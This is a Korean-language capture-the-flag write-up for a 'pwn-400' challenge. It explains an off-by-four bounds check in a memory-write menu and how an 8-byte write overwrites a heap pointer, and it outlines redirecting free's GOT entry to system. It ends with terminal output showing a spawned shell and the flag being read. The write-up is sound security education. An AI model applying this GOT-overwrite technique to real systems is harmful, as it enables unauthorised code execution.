## solve

#### menu
```
[1] mov dword register, register
[2] mov dword memory, register
[3] mov dword register, memory
[4] mov dword register, $data
[5] mov qword register, register
[6] mov qword memory, register
[7] mov qword register, memory
[8] mov qword register, $data
[9] sub register, register
[10] sub register, memory
[11] sub register, $data
[12] add register, register
[13] add register, memory
[14] add register, $data
[15] push $string
[16] push dword $data
[17] pop $string
[18] pop dword $data
[19] int 0x80
[20] Exit..
```
</br>

* 8번 메뉴를 통해 rdx에 값을 저장할 수 있다. (그냥 8바이트를 저장할 수 있다.)

* 6번 메뉴에서 레지스터에 있는 값을 메모리에 저장한다. (그냥 8바이트가 리틀엔디안 방식으로 저장이된다.)

</br>

## Vulnerabilities
```
if ( v4 < (unsigned int)&unk_804C0E0 || v4 > (unsigned int)&unk_804C4DC )
```
* 6번 메뉴에서 범위를 검사하는데 0x804C4DC를 넘으면 안된다.</br>

```
buf = malloc(0x100u);
ptr = malloc(0x400u);
dword_804C4E0 = buf;
dword_804C4E4 = ptr;
```

* 바로 뒤의 804C4e0에는 buf의 주소인 힙의 주소가 저장되어 있는데, 만약 6번 메뉴에서 memory의 주소가 804C4DC로 지정을 하게되면 , 리틀엔디안 방식으로 8바이트가 저장되기 때문에 804C4e0를 overwrite 할 수 있다.

* 따라서 804C4e0에 free함수의 got주소를 overwrite하고 난 뒤, modify메뉴를 이용해서 buf의 값은 system함수의 주소로, ptr의 값은 '/bin/sh\x00' 으로 수정한다. 그리고 종료를 하게 되면 free(ptr)이 호출되고, system('/bin/sh\x00') 이 호출된다.

</br>

## Result
```
~/machome/ctf/doubles_ctf/pwn-400(master*) » python exploit.py k                                     stitch@certis
 OK..
[ Virtual Assembly System ]
[1] Show Examples
[2] Generate Assembly
[3] Modify Name and Description
[4] Help
[5] Exit
-> $ 5
Bye Bye~~
\x00$ id
uid=1002(prob02) gid=1002(prob02) groups=1002(prob02)
$ ls /home/prob02
asm
flag
$ cat /home/prob02/flag
flag{4sm_1s_s0_h4rd}
$
```
